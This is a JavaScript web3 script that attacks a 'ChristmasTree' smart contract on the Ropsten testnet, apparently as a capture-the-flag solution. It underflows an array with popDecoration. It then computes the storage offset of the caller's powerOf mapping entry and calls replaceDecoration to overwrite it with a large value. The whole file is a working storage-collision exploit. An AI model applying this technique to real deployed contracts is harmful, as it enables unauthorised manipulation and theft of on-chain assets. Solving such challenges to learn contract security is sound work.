const HDWalletProvider = require("truffle-hdwallet-provider");
require('dotenv').config();
const fs   = require('fs');
const Web3 = require('web3');

const mnemonic = process.env.ROPSTEN_MNEMONIC;
const hsot = "https://ropsten.infura.io/v3/" + process.env.ROPSTEN_INFURA_ACCESS_TOKEN;
const provider = new HDWalletProvider(mnemonic, hsot);

const web3 = new Web3(provider);

var christmasTreeABI     = JSON.parse(fs.readFileSync('./build/contracts/ChristmasTree.json')).abi;
var christmasTreeAddress = '0x0a97246d46703F72B5c34828f80171F005f66c60';
var christmasTree        = new web3.eth.Contract(christmasTreeABI, christmasTreeAddress);

execute();

async function execute() {
    const address = await web3.eth.getAccounts();
    console.log(address);
    const account = address[0];

    const popDecoration = await christmasTree.methods.popDecoration().send({from: account});
    console.log(popDecoration);

    const powerAbi = web3.eth.abi.encodeParameters(
        ['uint256', 'uint256'],
        [account, 0]
    );
    const powerKey = web3.utils.sha3(powerAbi);
    const decorateZeroAbi = web3.eth.abi.encodeParameters(
        ['uint256', 'uint256'],
        [account, 1]
    );
    const decorateKey = web3.utils.sha3(web3.utils.sha3(decorateZeroAbi));
    const decorateTargetIndex = web3.utils.toBN(powerKey).sub(web3.utils.toBN(decorateKey));
    console.log(powerKey);
    console.log(decorateKey);
    console.log(web3.utils.toHex(decorateTargetIndex));

    await christmasTree.methods.replaceDecoration(web3.utils.toHex(decorateTargetIndex), 100000000).send({from: account});
    const power = await christmasTree.methods.powerOf(account).call();
    console.log(power);

    provider.engine.stop();
}